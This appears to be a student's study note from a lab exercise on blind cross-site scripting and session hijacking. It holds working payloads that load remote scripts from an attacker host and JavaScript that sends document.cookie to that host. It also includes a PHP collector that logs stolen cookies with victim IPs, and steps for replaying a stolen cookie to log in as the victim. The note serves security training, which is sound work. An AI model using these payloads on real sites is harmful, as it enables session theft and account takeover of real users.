- With the **ability to execute JavaScript code on the victim's browse**r, we may be able to **==collect their cookies and send them to our server to hijack their logged-in session==** by performing a `Session Hijacking` (aka `Cookie Stealing`) attack.

# Blind XSS Detection
---
- We usually start XSS attacks by **trying to discover if and where an XSS vulnerability exists.**
- However, in this exercise, we will be dealing with a `Blind XSS` vulnerability. **==A Blind XSS vulnerability occurs when the vulnerability is triggered on a page we don't have access to.==**

- Blind XSS vulnerabilities **==usually occur with forms only accessible by certain users (e.g., Admins).==** Some potential examples include:
	- **Contact Forms**
	- Reviews
	- **User Details**
	- Support Tickets
	- **HTTP User-Agent header**

- We see a **User Registration page with multiple fields, so let's try to submit a `test` user** to see how the form handles the data:
	- ![[Pasted image 20251029070524.png]]
- As we can see, once we **submit the form we get the following message:**
	- ![[Pasted image 20251029070542.png]]
- This indicates that **we will not see how our input will be handled** or how it will look in the browser since it will appear for the Admin only in a certain Admin Panel that we do not have access to.
- As we do not have access over the Admin panel in this case, 
	- **`how would we be able to detect an XSS vulnerability if we cannot see how the output is handled?`**

- To do so, **we can use the same trick we used in the previous section**, which is to use a **==JavaScript payload that sends an HTTP request==** back to our server.
- If the JavaScript code gets executed, **we will get a response on our machine, and we will know that the page is indeed vulnerable.**

# Loading a Remote Script
---
- In HTML, **we can write JavaScript code within the `<script>` tags**, but we can **also include a remote script by providing its URL**, as follows:
	- `<script src="http://OUR_IP/script.js"></script>`

- So, **we can use this to execute a remote JavaScript file** that is served on our VM.
  
- We can ==**change the requested script name from `script.js` to the name of the field we are injecting in**==, such that **==when we get the request in our VM, we can identify the vulnerable input field==** that executed the script, as follows:
	- `<script src="http://OUR_IP/username"></script>`

- **==If we get a request for `/username`, then we know that the `username` field==** is vulnerable to XSS, and so on.
- The following **are a few examples we can use from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss):**

```js
	<script src=http://OUR_IP></script>
	'><script src=http://OUR_IP></script>
	"><script src=http://OUR_IP></script>
	javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
	<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
	<script>$.getScript("http://OUR_IP")</script>
	  ```
- As we can see, various payloads start with an injection like `'>`, which may or may not work depending on how our input is handled in the backend.
- **If we had access to the source code (i.e., in a DOM XSS),** it would be **possible to precisely write the required payload for a successful injection**. 
- **==This is why Blind XSS has a higher success rate with DOM XSS type of vulnerabilities.==**
- Before we start sending payloads, we need to start a listener on our VM, using `netcat` or `php` as shown in a previous section:
	- `sudo php -S 0.0.0.0:80`

- Now **we can start testing these payloads one by one by using one of them for all of input fields** and **appending the name of the field after our IP**, as mentioned earlier, like:
```html
<script src=http://OUR_IP/fullname></script> #this goes inside the full-name field
<script src=http://OUR_IP/username></script> #this goes inside the username field
```

- **Tip**: We will notice that the **email must match an email format, even if we try manipulating the HTTP request parameters**, as it seems to be validated **on both the front-end and the back-end**. 
- Hence, **==the email field is not vulnerable, and we can skip testing it.==** 
- Likewise, **==we may skip the password field, as passwords are usually hashed and not usually shown in cleartext.==** This **helps us in reducing the number of potentially vulnerable input** fields we need to test.

`Try testing various remote script XSS payloads with the remaining input fields, and see which of them sends an HTTP request to find a working payload`.

# Session Hijacking
---
- Once **we find a working XSS payload** and have identified the vulnerable input field, **we can proceed to XSS exploitation and perform a Session Hijacking attack.**
- It **requires a JavaScript payload to send us the required data and a PHP script** hosted on our server to grab and parse the transmitted data.
- There are **multiple JavaScript payloads we can use to grab the session cookie** and send it to us, as shown by [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#exploit-code-or-poc):
- ```js
  document.location='http://OUR_IP/index.php?c='+document.cookie;
  new Image().src='http://OUR_IP/index.php?c='+document.cookie;
  ```

- Using **any of the two payloads should work in sending us a cookie**, but we'll **use the second one, as it simply adds an image to the page, which may not be very malicious** looking.
- We can **write any of these JavaScript payloads to `script.js`, which will be hosted on our VM as well**:
	- `new Image().src='http://OUR_IP/index.php?c='+document.cookie`

- Now, **==we can change the URL in the XSS payload we found earlier to use `script.js`==**:
	- `<script src=http://OUR_IP/script.js></script>`

- We can save the **following PHP script as `index.php`, and re-run the PHP server again:**
  
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

- Now, **we wait for the victim to visit the vulnerable page and view our XSS payload.** 
- **==Once they do, we will get two requests on our server, one for `script.js`, which in turn will make another request with the cookie value==**

# Logging as user
---
- Finally, **we can use this cookie on the `login.php` page to access the victim's account.** 
- To do so, once we navigate to `/hijacking/login.php`, **we can click `Shift+F9` in Firefox to reveal the `Storage` bar in the Developer Tools.** 
- Then, **we can click on the `+` button on the top right corner and add our cookie, where the `Name` is the part before `=` and the `Value` is the part after `=` from our stolen cookie**

# Assessment
---
- We can detect the Vulnerable param manually, and Profile Picture URL seemed suspicious:
	- ![[Pasted image 20251029072108.png]]
- We can test with netcat:
	- `http://10.129.234.166/hijacking/?fullname=admin&username=admin&password=admin&email=admin%40gmail.com&imgurl=http://10.10.15.204/hecker`
	- ![[Pasted image 20251029072136.png]]
- Now follow the above steps:
	- ![[Pasted image 20251029072236.png]]
	- 